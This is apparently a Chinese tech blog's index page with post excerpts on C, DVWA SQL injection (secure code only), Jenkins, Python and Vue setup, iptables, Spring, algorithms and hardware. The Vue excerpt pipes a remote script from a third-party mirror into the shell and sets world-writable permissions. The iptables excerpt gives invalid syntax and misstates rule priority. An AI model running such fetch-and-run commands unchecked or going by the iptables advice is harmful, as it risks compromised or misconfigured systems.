		<h2 class="list__title post__title">
			<a href="/posts/a91c959b0bb55b28c91ad80838f2c5f8/" rel="bookmark">
			用C语言写一个三数求最大值代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可以这样写：
#include &lt;stdio.h&gt; int main(void) { int a, b, c; printf("请输入三个数字："); scanf("%d%d%d", &amp;amp;a, &amp;amp;b, &amp;amp;c); int max = a; if (b &gt; max) { max = b; } if (c &gt; max) { max = c; } printf("最大的数是：%d\n", max); return 0; } 这段代码会从用户输入三个数字，然后找出这三个数字中的最大值并输出。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95b5c849c329f422a175eee37787594c/" rel="bookmark">
			DVWA——SQL注入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Low 审计代码 &lt;?php if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) { $id = intval ($id); switch ($_DVWA['SQLI_DB']) { case MYSQL: // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) { // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95b5c849c329f422a175eee37787594c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0c62e805ef39ebdb0f72a606ec11cd8/" rel="bookmark">
			完美解决微信浏览器内长按识别个人收款码的案例分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信8.0.16之前版本可以实现长按识别，
之后的版本为了限制非当面交易，
长按识别的地方显示一下，马上被屏蔽不见……
解决方法很简单，调整原来的收款页面样式，就可以支持长按识别微信个人收款码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d44f37ad5844e409523b6c1b458d995/" rel="bookmark">
			Jenkins自动化部署SpringBoot项目(windows环境)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、Jenkins介绍1.1、概念1.2、优势1.3、Jenkins目的 2、环境准备3、Jenkins下载3.1、下载3.2、运行3.3、问题解决 4、Jenkins配置4.1、用户配置4.2、系统配置4.3、全局工具配置-最重要 5、新建项目7、测试8、错误解决 1、Jenkins介绍 1.1、概念 Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具Jenkins是一个可扩展的持续集成引擎用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能 持续集成：
就是通常所说的CI（Continues Integration），可以说是现代软件技术开发的基础
持续集成是一种软件开发实践，即团队开发成员经常集成他们的工作，通常每个成员至少集成一次，也意味着每天可能会发生多次集成。
每次集成都通过自动化的构建（包括编译，发布，自动化测试）来验证，从而尽快地发现集成错误。许多团队发现这个过程可以大大减少集成的问题，让团队能够更快的开发内聚的软件
1.2、优势 Jenkins是一个自包含的基于java的程序，可以开箱即用，包含Windows、Linux等操作系统的软件包Jenkins可以通过其web界面轻松设置和配置，其中包括动态错误检查和内置帮助在插件中心中有数百个插件，Jenkins集成了持续集成和持续交付工具链中的几乎所有工具Jenkins可以轻松地跨多台机器分配工作，帮助更快地跨多个平台进行构建、测试和部署Jenkins可以通过其插件架构进行扩展，为Jenkins所能做的事情提供了几乎无限的可能性作为可扩展的自动化服务器，Jenkins可以用作简单的CI服务器，也可以变成任何项目的持续交付中心 1.3、Jenkins目的 Jenkins 主要是监控软件开发流程，快速显示问题。所以能保证开发人员以及相关人员省时省力提高开发效率CI系统在整个开发过程中的主要作用是控制：当系统在代码存储库中探测到修改时，它将运行构建的任务委托给构建过程本身如果构建失败了，那么CI系统将通知相关人员，然后继续监视存储库。它的角色看起来是被动的；但它确能快速反映问题 2、环境准备 我们本文主要介绍在windows系统中安装和使用Jenkins，那么在此之前，请先保证你电脑上有如下环境：
JDK8（我这里就是JDK8的环境）git（我这里使用的版本是：2.37.1.windows.1）maven（我这里使用的版本是：3.8.6）一个保存SpringBoot项目代码的git仓库（注意：该项目的启动端口不能与Jenkins相同！Jenkins默认为8080） 我这里的SpringBoot项目git地址是：https://gitee.com/colinWu_java/JenkinsTest.git，项目启动端口是：8001
3、Jenkins下载 3.1、下载 下载网址：https://get.jenkins.io/war-stable
下载war包即可，如下：
注意JDK的版本，你下载的版本太高的话，需要JDK的版本也会很高，所以看清楚了再下载，下载需要时间很久。我这里选择的是【2.346.3】，然后下载：
下载的包如下：
3.2、运行 然后用cmd进入目录后，运行jenkins：
java -jar jenkins.war 如下：
如果你的JDK版本不支持的话就会报错了，如下：
此时，你要么就升级你的JDK，要么就换一个低版本的jenkins，推荐换一个低版本的jenkins，因为JDK版本升级的话影响太广泛了
然后访问jenkins，在浏览器输入：http://localhost:8080，如下：
3.3、问题解决 如果上面界面等待几秒，还是这个界面，那就是jenkins镜像有问题，按照下面步骤解决
1、第一次运行jenkins后，会在C盘的用户目录中，生成一个.jenkins文件夹，进入到该文件夹
2、找到文件：hudson.model.UpdateCenter.xml
3、编辑这个文件
镜像有很多种，大家可以自行百度一下
4、重启jenkins，再访问http://localhost:8080，就会进入到密码认证界面：
cmd窗口中，会打印密码，直接复制填入即可
然后加载一会之后出现如下配置界面了：
点击【安装推荐的插件】即可：
4、Jenkins配置 4.1、用户配置 上面页面可能花的时间会比较久，安装完成后是这样的界面：
我这里设置到账号是：wjb，密码是：itsource123，然后点击【保存并完成】：
然后：
点击【开始使用Jenkins】按钮即可
4.2、系统配置 4.3、全局工具配置-最重要 下面几项必须配置：
mavengitJDK 然后继续配置JDK：
然后继续配置git：
最后配置maven：
安装maven插件：
安装插件进度页面：
然后重启一下Jenkins
5、新建项目 新建Item：
在源码管理设置模块，选择Git，然后输入Gitee项目仓库地址，如下图：
继续往下翻，构建触发器处，勾选Poll SCM，并输入如下信息：
* * * * * 如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d44f37ad5844e409523b6c1b458d995/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f86f4b5512aa009664d10420b674f3b/" rel="bookmark">
			遥感图像处理：最小噪声分离变换（Minimum Noise Fraction Rotation，MNF Rotation）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遥感图像处理：最小噪声分离变换（Minimum Noise Fraction Rotation，MNF Rotation 1.PCA变换2.MNF3.PCA和MNF 1.PCA变换 在统计学中，主成分分析PCA是一种简化数据集的技术。它是一个线性变换。这个变换把数据变换到一个新的坐标系统中，使得任何数据投影的第一大方差在第一个坐标(称为第一主成分)上，第二大方差在第二个坐标(第二主成分)上，依次类推。主成分分析经常用于减少数据集的维数，同时保持数据集的对方差贡献最大的特征。这是通过保留低阶主成分，忽略高阶主成分做到的。这样低阶成分往往能够保留住数据的最重要方面。但是，这也不是一定的，要视具体应用而定。
第一步计算矩阵 X 的样本的协方差矩阵 S（此为不标准PCA，标准PCA计算相关系数矩阵C） :第二步计算协方差矩阵S（或C）的特征向量 e1,e2,…,eN和特征值 , t = 1,2,…,N ；第三步投影数据到特征向量张成的空间之中。利用公式 n e w B V i , p = ∑ k = 1 n e i B V i , k new BV_{i,p}=\sum^n_{k=1}e_iBV_{i,k} newBVi,p​=∑k=1n​ei​BVi,k​，其中BV值是原样本中对应维度的值 参考：【CSDN】基于主成分变换(PCA)的图像融合
2.MNF 最小噪声分离变换（Minimum Noise Fraction Rotation，MNF Rotation）工具用于判定图像数据内在的维数（即波段数），分离数据中的噪声，减少随后处理中的计算需求量。MNF本质上是两次层叠的主成分变换。第一次变换（基于估计的噪声协方差矩阵）用于分离和重新调节数据中的噪声，这步操作使变换后的噪声数据只有最小的方差且没有波段间的相关。第二步是对噪声白化数据（Noise-whitened）的标准主成分变换。
参考：MNF最小噪声分离变换(转)
3.PCA和MNF 由此可知,MNF变换具有PCA变换的性质,是一种正交变换,变换后得到的向量中的各元素互不相关,第一分量集中了大量的信息,随着维数的增加,影像质量逐渐下降,按照信噪比从大到小排列,而不像PCA变换按照方差由大到小排列,从而克服了噪声对影像质量的影响。正因为变换过程中的噪声具有单位方差,且波段间不相关,所以它比PCA变换更加优越[4]。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7278585c8a473a4467d0600ae3730c0d/" rel="bookmark">
			Windows下Python3.9.13的安装教程（附安装包）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、下载Python3.9.13 1、进入Python官网。
https://www.python.org/
2、点击Python官网的Downloads-Windows，进入https://www.python.org/downloads/windows/ 页面，选择下载文件。
附 Python3.9.13 安装包百度云下载链接
链接：https://pan.baidu.com/s/1AJykgUk2tsLHBOHwDtlqVA
提取码：abcd
二、安装Python3 1、将下载完成的Python安装包双击打开,然后将下方的两个选项框都打钩,再点击Customize installation进入下一步。
2、这里默认所有选项都是打钩的,点击Next进入下一步。
3、将Install for all users选项打钩,其他的选项保持默认,默认安装路径一般为
C:\Users\Admin\AppData\Local\Programs\Python\Python39，
这里可以点击Browse，根据自己的需求选择安装目录，例如选择C:\Program Files\Python39，目录名中最好不要包含中文。选好安装位置后，点击Install进行安装。
4、之后Python开始安装，稍等一会就安装好了。
5、安装后，会显示下面的菜单，表示已经安装成功了，点击Close关闭。
6、进入C:\Program Files\Python39目录,可以看到python.exe文件，表明Python3.9.13已经成功安装在这里。
三、配置环境变量 安装完Python3.9.13后,系统已经自动配好了环境变量(因为上面勾选了添加环境变量的选项)，我们在命令行里面使用python命令,就会进入Python3.9.13的交互界面。
四、验证安装 1、按Win+R进入运行界面，输入cmd回车，进入Windows的命令行，在命令行输入python可以进入Python3.9.13的命令行模式，说明Python3.9.13安装成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e54242d7b2e1f51259ca8da7e6d9f0e/" rel="bookmark">
			iptables 设置下面的规则优先级最高 iptables -A INPUT -p tcp --dport * -j ACCEPT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 iptables 中，规则的优先级是由它们在规则链中的位置决定的。因此，要让下面的规则具有最高优先级，你需要将其放在规则链的最前面。
例如：
iptables -A INPUT -p tcp --dport * -j ACCEPT iptables -A INPUT -p udp --dport * -j DROP 在这个例子中，对 TCP 流量的 ACCEPT 规则具有最高优先级，因为它位于规则链的最前面。
需要注意的是，在 iptables 中还有一个名为“内置链”的概念。内置链中的规则会在自定义规则之前执行，因此内置链中的规则优先级比自定义规则高。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e3688cb1752f0f90bf7d883a36c1bf9/" rel="bookmark">
			在Mac上配置Vue开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为Vue是NodeJS的模块，要想使用Vue需要先安装NodeJS 在Mac中安装NodeJS通过brew包管理器就会很方便, 因为访问源速度问题建议使用5（阿里），Homebrew开源项目地址：https://gitee.com/cunkai/HomebrewCN/blob/master/README.md
在终端输入, 在安装过程中提示选择下载镜像源，选择阿里即可
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)" 安装NodeJS 使用brew安装NodeJS
brew install nodejs 安装完毕后，执行以下命令查看nodejs的版本
apple@apple ~ % node -v v19.3.0 apple@apple ~ % npm -v 8.19.2 ``` ​ 打开终端，执行以下俩条命令修改Node仓库位置,注意引号中的路径要换成你创建的文件夹所在的路径(xxx是用户名)
npm config set prefix “/Users/xxx/kaifa/nodejs/node_global” npm config set cache “/Users/xxx/kaifa/nodejs/node_cache” ​ 修改nodejs模块安装目录访问权限
sudo chmod -R 777 /Users/xxx/kaifa/nodejs 配置环境变量
因为改变了全局安装路径，所以需要配置环境变量，不然出现新安装的工具命令找不到的问题。
a. 执行命令vim ~/.bash_profile或者vim ~/.zshrc(建议执行后一个命令)
b. 输入 i`,在文件的最后一行加入我们的命令位置如：
export PATH="/usr/local/Cellar/node/19.3.0/bin:$PATH" # xxx 要换成当前用户名 和 上面配置的 路径相同 export NODE_MODULES='/Users/xxx/nodejs/node_global' export PATH=$NODE_MODULES/bin:$PATH c.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e3688cb1752f0f90bf7d883a36c1bf9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b21784e3799ac4218997bdf086a8fdb/" rel="bookmark">
			SpringBoot默认包扫描机制及使用@ComponentScan指定扫描路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot默认包扫描机制 标注了@Component和@Component的衍生注解如@Controller,@Service,@Repository就可以把当前的Bean加入到IOC容器中。那么SpringBoot是如何知道要去扫描@Component注解的呢。@ComponentScan做的事情就是告诉Spring从哪里找到bean
SpringBoot默认包扫描机制： 从启动类所在包开始，扫描当前包及其子级包下的所有文件。
我们可以通过以下的测试来验证一下。
启动应用并访问BannerController这个控制器，目录结构如图
访问结果正常
当把BannerController移动到上一级目录，应用可以正常启动
但是再次访问刚才的路径时却出现了如下错误，代码是没有变动的，是Controller扫描 不到了。
实际上SpringBoot是通过@ComponentScan进行扫描。默认情况下，入口类上面的@SpringBootApplication里面有一个@ComponentScan,也就相当于@ComponentScan标注在入口类上。所以默认情况下，扫描入口类同级及其子级包下的所有文件。当我们想自己制定包扫描路径就需要加一个@ComponentScan
@ComponentScan的使用 常用参数含义 basePackages与value: 用于指定包的路径，进行扫描(默认参数)
basePackageClasses: 用于指定某个类的包的路径进行扫描
includeFilters: 包含的过滤条件
FilterType.ANNOTATION：按照注解过滤
FilterType.ASSIGNABLE_TYPE：按照给定的类型
FilterType.ASPECTJ：使用ASPECTJ表达式
FilterType.REGEX：正则
FilterType.CUSTOM：自定义规则
excludeFilters: 排除的过滤条件，用法和includeFilters一样
nameGenerator: bean的名称的生成器
useDefaultFilters: 是否开启对@Component，@Repository，@Service，@Controller的类进行检测
指定要扫描的包 上述例子，如果想扫描启动类上一级包，使用@ComponentScan指定包扫描路径,即可将BannerController加入到容器
@SpringBootApplication@ComponentScan("com.lin")publicclassMissyouApplication{publicstaticvoidmain(String[] args){ SpringApplication.run(MissyouApplication.class, args);}}1234567 excludeFilters 排除某些包的扫描 测试类准备：
@ControllerpublicclassBannerController{BannerController(){ System.out.println("Hello BannerController");}}--------------------------------------------------------------------@ServicepublicclassTestService{TestService(){ System.out.println("Hello TestService");}}12345678910111213 目录结构如下：
启动类上加@ComponentScan指定扫描lin这个包并排除@Controller这个注解标注的类
@SpringBootApplication@ComponentScan(value ="com.lin", excludeFilters ={@ComponentScan.Filter(type = FilterType.ANNOTATION,value ={Controller.class})})publicclassMissyouApplication{publicstaticvoidmain(String[] args){ SpringApplication.run(MissyouApplication.class, args);}}123456789 启动应用，控制台打印出了TestService而没有BannerController
@Component与@ComponentScan 在某个类上使用@Component注解，表明当需要创建类时，这个被注解标注的类是一个候选类。就像是有同学在举手。
@ComponentScan 用于扫描指定包下的类。就像看都有哪些举手了。
原文链接：https://blog.csdn.net/xfx_1994/article/details/103976575
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d8ff57147895c78d2e1271528a5e94f/" rel="bookmark">
			【算法笔记】最近公共祖先（LCA）问题求解——倍增算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0. 前言 最近公共祖先简称 LCA（Lowest Common Ancestor）。两个节点的最近公共祖先，就是这两个点的公共祖先里面，离根最远的那个。
这种算法应用很广泛，可以很容易解决树上最短路等问题。
为了方便，我们记某点集 S = { v 1 , v 2 , … , v n } S=\{v_1,v_2,\ldots,v_n\} S={v1​,v2​,…,vn​} 的最近公共祖先为 LCA ( v 1 , v 2 , … , v n ) \text{LCA}(v_1,v_2,\ldots,v_n) LCA(v1​,v2​,…,vn​) 或 LCA ( S ) \text{LCA}(S) LCA(S)。
部分内容参考 OI Wiki，文章中所有算法均使用C++实现。
例题：洛谷 P3379 【模板】最近公共祖先（LCA）
1. 性质 LCA ( { u } ) = u \text{LCA}(\{u\})=u LCA({u})=u； u u u 是 v v v 的祖先，当且仅当 LCA ( u , v ) = u \text{LCA}(u,v)=u LCA(u,v)=u；如果 u u u 不为 v v v 的祖先并且 v v v 不为 u u u 的祖先，那么 u , v u,v u,v 分别处于 LCA ( u , v ) \text{LCA}(u,v) LCA(u,v) 的两棵不同子树中；前序遍历中， LCA ( S ) \text{LCA}(S) LCA(S) 出现在所有 S S S 中元素之前，后序遍历中 LCA ( S ) \text{LCA}(S) LCA(S) 则出现在所有 S S S 中元素之后；两点集并的最近公共祖先为两点集分别的最近公共祖先的最近公共祖先，即 LCA ( A ∪ B ) = LCA ( LCA ( A ) , LCA ( B ) ) \text{LCA}(A\cup B)=\text{LCA}(\text{LCA}(A), \text{LCA}(B)) LCA(A∪B)=LCA(LCA(A),LCA(B))；两点的最近公共祖先必定处在树上两点间的最短路上； d ( u , v ) = h ( u ) + h ( v ) − 2 h ( LCA ( u , v ) ) d(u,v)=h(u)+h(v)-2h(\text{LCA}(u,v)) d(u,v)=h(u)+h(v)−2h(LCA(u,v))，其中 d d d 是树上两点间的距离， h h h 代表某点到树根的距离。 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d8ff57147895c78d2e1271528a5e94f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3588ce7df582e35f940ba19c421e34a3/" rel="bookmark">
			前后端的身份认证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Web 开发模式 目前主流的 Web 开发模式有两种，分别是：
基于服务端渲染的传统 Web 开发模式基于前后端分离的新型 Web 开发模式 1.1、服务端渲染的 Web 开发模式 服务端渲染的概念：服务器发送给客户端的 HTML 页面，是在服务器通过字符串的拼接，动态生成的。因此，客户端不需要使用 Ajax 这样的技术额外请求页面的数据。代码示例如下：
1.2、服务端渲染的优缺点 优点：
前端耗时少。因为服务器端负责动态生成 HTML 内容，浏览器只需要直接渲染页面即可。尤其是移动端，更省电。有利于SEO。因为服务器端响应的是完整的 HTML 页面内容，所以爬虫更容易爬取获得信息，更有利于 SEO。 缺点：
占用服务器端资源。即服务器端完成 HTML 页面内容的拼接，如果请求较多，会对服务器造成一定的访问压力。不利于前后端分离，开发效率低。使用服务器端渲染，则无法进行分工合作，尤其对于前端复杂度高的项目，不利于项目高效开发。 1.3、前后端分离的 Web 开发模式 前后端分离的概念：前后端分离的开发模式，依赖于 Ajax 技术的广泛应用。简而言之，前后端分离的 Web 开发模式，就是后端只负责提供 API 接口，前端使用 Ajax 调用接口的开发模式。
1.4、前后端分离的优缺点 优点：
开发体验好。前端专注于 UI 页面的开发，后端专注于api 的开发，且前端有更多的选择性。用户体验好。Ajax 技术的广泛应用，极大的提高了用户的体验，可以轻松实现页面的局部刷新。减轻了服务器端的渲染压力。因为页面最终是在每个用户的浏览器中生成的。 缺点：
不利于 SEO。因为完整的 HTML 页面需要在客户端动态拼接完成，所以爬虫对无法爬取页面的有效信息。（解决方案：利用 Vue、React 等前端框架的 SSR （server side render）技术能够很好的解决 SEO 问题！）
1.5、如何选择 Web 开发模式 不谈业务场景而盲目选择使用何种开发模式都是耍流氓。
比如企业级网站，主要功能是展示而没有复杂的交互，并且需要良好的 SEO，则这时我们就需要使用服务器端渲染；而类似后台管理项目，交互性比较强，不需要考虑 SEO，那么就可以使用前后端分离的开发模式。 另外，具体使用何种开发模式并不是绝对的，为了同时兼顾了首页的渲染速度和前后端分离的开发效率，一些网站采用了首屏服务器端渲染 + 其他页面前后端分离的开发模式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3588ce7df582e35f940ba19c421e34a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b2e00882a7e1ff632f899dd2b74bc87/" rel="bookmark">
			Halcon常用算子汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		显示相关 打开一个窗口 dev_open_window() 打开一个适应图像大小的窗口 dev_open_window_fit_image 获取图像窗口句柄 dev_get_window () 清除图像窗口的内容 dev_clear_window () 关闭活动窗口 dev_close_window() 显示图像 dev_display() 在当前窗口显示文字 dev_disp_text() 在指定窗口显示文字 disp_message(） 设置显示字体类型 set_display_font() 设置显示颜色 dev_set_color() 设置轮廓线的线宽 dev_set_line_width() 定义区域填充模式 dev_set_draw() image相关 加载图像 read_image() 保存图像 write_image() 剪切一个或多个矩形图像区域 crop_part() 彩色图转灰度图 rgb1_to_gray() 灰度转彩色 compose3() 灰度值取反 invert_image() 三通道彩色图像分离 decompose3() 获取图像的Roi reduce_domain() 获取图像尺寸 get_image_size() 确定区域内的最小和最大灰度值。 min_max_gray() 计算灰度值的平均值和偏差。 intensity() 两张图像相加 add_image() 两张图像相减 sub_image() 计算两幅图像的最大值 max_image() 计算两幅图像的最小值 min_image() 镜像图像 mirror_image() 围绕图像中心旋转图像 rotate_image() 将图像缩放到给定的大小 zoom_image_size() 以固定灰度值将区域绘制到图像中 paint_region() 计算灰度值直方图 gray_histo() 直方图转换为区域 gen_region_histo() 根据灰度值特征选择区域 select_gray() region相关 读取region read_region() 向文件写入区域 write_region() 创建一个空区域 gen_empty_region() 相对于最小的周边矩形剪辑区域 clip_region_rel() region转为二进制字节图像 region_to_bin() 从XLD轮廓线创建一个区域 gen_region_contour_xld() region的重心和坐标 area_center() 区域的方向 orientation_region() region特征筛选 connection() select_shape() 选择给定形状的区域 select_shape_std() 填充区域的孔洞 fill_up() 在有形状特征的区域填上洞 fill_up_shape(） 根据区域的相对位置对区域进行排序 sort_region() 获取区域的方向 orientation_region() 移动区域 move_region() 获取区域的边界 boundary() 计算两个区域的交集 intersection() 获取区域的补码 complement() 计算区域的骨架 skeleton() 变换一个区域的形状 shape_trans() XLD相关 将XLD轮廓以DXF格式写入文件 write_contour_xld_dxf() 从DXF文件中读取XLD轮廓 read_contour_xld_dxf () 从区域生成XLD轮廓 gen_contour_region_xld() 将骨架转换为XLD轮廓 gen_contours_skeleton_xld() 获取与XLD轮廓的平行轮廓。 gen_parallel_contour_xld() 获取XLD轮廓的全局属性值。 get_contour_global_attrib_xld() 返回XLD轮廓的坐标 get_contour_xld() 为每个输入点生成一个十字形状的XLD轮廓线 gen_cross_contour_xld() 创建一个箭头形状的XLD轮廓 gen_arrow_contour_xld() 从多边形(以元组的形式给出)生成XLD轮廓 gen_contour_polygon_xld() 创建圆或圆弧XLD轮廓 gen_circle_contour_xld() 拟合直线 fit_line_contour_xld() 拟合圆 fit_circle_contour_xld() 线段XLD轮廓分为线段和圆形或椭圆弧 segment_contours_xld() 连接近似共线的轮廓 union_collinear_contours_xld() 连接端点接近的轮廓 union_adjacent_contours_xld() 连接同一圆的轮廓 union_cocircular_contours_xld() 平滑XLD轮廓 smooth_contours_xld() 变换轮廓或多边形的形状 shape_trans_xld() 根据特性选择XLD轮廓 select_contours_xld() 闭合XLD轮廓 close_contours_xld() 根据相对位置排序轮廓 sort_contours_xld() 裁剪XLD轮廓 clip_contours_xld() object相关 连接两个标志性的对象元组 concat_obj() 仿射变换： hom_mat2d_identity：生成二维变换的齐次变换矩阵。 hom_mat2d_translate:向齐次二维变换矩阵添加平移。 hom_mat2d_rotate—向齐次二维变换矩阵添加一个旋转。 hom_mat2d_scale -向齐次二维变换矩阵添加缩放。 vector_angle_to_rigid -从点和角度计算一个刚性仿射变换。 对image、region、XLD轮廓应用任意的仿射二维变换 affine_trans_image() affine_trans_region() affine_trans_contour_xld() 图像增强 增强图像的对比度 emphasize() 扩展最大灰度值在0 ~ 255范围内 scale_image_max() 缩放图像的灰度值 scale_image() 增强图像中的圆点 dots_image() 几何计算 计算两条线之间的夹角 angle_ll() 计算一条直线和横轴之间的夹角 angle_lx() 弧度转角度 tuple_deg() 角度转弧度 tuple_rad() 坐标系转换 笛卡尔坐标转换为极坐标 polar_trans_image_ext() 将极坐标中的图像转换回笛卡尔坐标 polar_trans_image_inv() 提取亚像素边缘 使用Deriche, Lanser, Shen或Canny滤波器提取亚像素精确的边缘 edges_sub_pix() 平滑滤波 shock_filter：冲击滤镜。 guided_filter：引导滤波。 binomial_filter：二项滤波器。 bilateral_filter：双边滤波。 texture_laws：Laws纹理滤镜。 mean_image：均值滤波。 median_image:中值滤波器。 耗时统计 count_seconds (start) *执行函数 count_seconds (end) seconds := end - start 持续更新ing
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b5dce0a8903eb485ba7f95d17a3f2b5/" rel="bookmark">
			【C&#43;&#43;高阶数据结构】跳表（skiplist）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🏆个人主页：企鹅不叫的博客
​ 🌈专栏
C语言初阶和进阶C项目Leetcode刷题初阶数据结构与算法C++初阶和进阶《深入理解计算机操作系统》《高质量C/C++编程》Linux ⭐️ 博主码云gitee链接：代码仓库地址
⚡若有帮助可以【关注+点赞+收藏】，大家一起进步！
💙系列文章💙 【C++高阶数据结构】并查集
【C++高阶数据结构】图
【C++高阶数据结构】LRU
【C++高阶数据结构】B树、B+树、B*树
文章目录 💙系列文章💙💎一、概念💎二、实现💎三、性能分析 💎一、概念 假如我们每相邻两个节点升高一层，增加一个指针，让指针指向下下个节点，如下图b所示。这样所有新增加的指针连成了一个新的链表，但它包含的节点个数只有原来的一半。由于新增加的指针，我们不再需要与链表中每个节点逐个进行比较了，需要比较的节点数大概只有原来的一半。
以此类推，我们可以在第二层新产生的链表上，继续为每相邻的两个节点升高一层，增加一个指针，从而产生第三层链表。如下图c，这样搜索效率就进一步提高了。
实际上，按照上面生成链表的方式，上面每一层链表的节点个数，是下面一层的节点个数的一半，这样查找过程就非常类似二分查找，使得查找的时间复杂度可以降低到O(log n)。
不再严格要求对应比例关系，而是插入一个节点的时候随机出一个层数
一个结点到底应该给几层？
一个节点的平均层数（也即包含的平均指针数目），计算如下：
当p=1/2时，每个节点所包含的平均指针数目为2；
当p=1/4时，每个节点所包含的平均指针数目为1.33。
💎二、实现 设计跳表
思路：
首先设计节点，包含节点值和存储next指针跳表设计，定义一个头节点，最大层数，生成层数概率 struct SkiplistNode { int _val; //用来存next指针的vector vector&lt;SkiplistNode*&gt; _nextV; SkiplistNode(int val,int level) :_val(val) ,_nextV(level,nullptr) {} }; class Skiplist { typedef SkiplistNode Node; public: Skiplist() { srand(time(0)); //头结点，层数是1 _head=new Node(-1,1); } vector&lt;Node*&gt; FindPrevNode(int num) { //创建一个临时节点先指向我们的头节点 Node* cur = _head; //初始化我们的层数是我们头结点的层数 int level = _head-&gt;_nextV.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b5dce0a8903eb485ba7f95d17a3f2b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92564745c0aed8642502d5ad903ec87c/" rel="bookmark">
			主板、内存条、硬盘、显卡认识和选购
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主板的主要功能是为计算机的其他部件提供插槽和接口，计算机的所有部件通过主板间接或直接组成了一个工作平台。主板是主机内部最大的一块电路板，上面安装了组成计算机的主要电路系统。
主芯片组是主板性能的核心，通常有南桥芯片和北桥芯片组成。除了南北桥芯片还有BIOS芯片、I/O芯片、集成声卡芯片、集成网卡芯片。
主板上的各种扩展插槽，常见的有以下几种：显卡插槽、SATA插槽、内存条插槽、CPU插槽、M.2 插槽、CPU风扇供电插槽、机箱风扇供电插槽、usb插槽等。主板的品牌往往意味着做工和用料的优劣。一线品牌主要有华硕、技嘉、微星和七彩虹。
内存条又称主存和内存储器，用于暂时存放CPU运算数据和硬盘等外部的交互数据，在计算机工作过程中，CPU会把数据调到内存中运算，运算完成后再将结果传递各部件。内存条主要由金手指、缺口、芯片、和散热片及卡槽组成。
金手指是内存与主板连接的桥梁，缺口可以防止内存条插反，芯片用来存放数据，散热片用来降低内存条温度。内存条的主流品牌有金士顿、威刚、三星、海盗船、芝奇等。
硬盘现在以固态硬盘为主，主流为M.2接口固态硬盘。固态硬盘相比传统机械硬盘具有读写速度快、防震抗摔、低功耗、无噪声、轻便等特点。目前主流的硬盘品牌有金士顿、三星、西部数据、东芝、闪迪、台电等。
显卡主要由显示芯片、显存、金手指、散热片和散热风扇组成。显示芯片是显卡上最重要的部分，其主要作用是处理软件指令，让显卡完成绘图功能，它直接决定了显卡的性能。显存是显卡临时存放数据的地方，其容量与速度对显卡有重要影响。显卡的选购主要看芯片厂商、芯片型号、制造工艺和核心频率。目前市面上的主流显卡有华硕、技嘉、微星、七彩虹、索泰等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f7f113197f340491ceda5760fa6a4bb/" rel="bookmark">
			TensorFlow之模型保存与加载
			</a>
		</h2>
		
